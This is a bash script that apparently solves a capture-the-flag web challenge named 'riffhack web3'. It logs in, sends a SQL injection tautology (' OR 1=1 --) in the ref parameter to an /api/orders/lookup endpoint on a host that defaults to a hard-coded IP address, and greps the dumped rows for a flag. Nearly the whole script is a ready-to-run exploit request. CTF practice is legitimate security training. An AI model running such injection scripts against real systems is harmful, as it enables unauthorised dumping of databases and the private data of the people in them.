#!/usr/bin/env bash
# solve-web3-sqli.sh — riffhack web3 (string-concat SQLi on /api/orders/lookup)
#
# The `ref=` query parameter is dropped into a raw SQL string. A classic
# tautology collapses `WHERE id = '<ref>'` and dumps every row, including the
# hidden one whose `notes` field carries the flag.
#
# Usage: solve-web3-sqli.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
source "$HERE/../lib/login.sh"

echo "[*] web3 (SQLi) against $HOST"

COOKIE=$(login "$HOST")

echo "[*] injecting tautology: ref=' OR 1=1 --"
resp=$(curl -sk -b "$COOKIE" --data-urlencode "ref=' OR 1=1 --" \
       -G "http://$HOST/api/orders/lookup")

echo "[*] response (pretty):"
printf '%s\n' "$resp" | python3 -m json.tool || printf '%s\n' "$resp"

flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag in response" >&2
  exit 1
fi
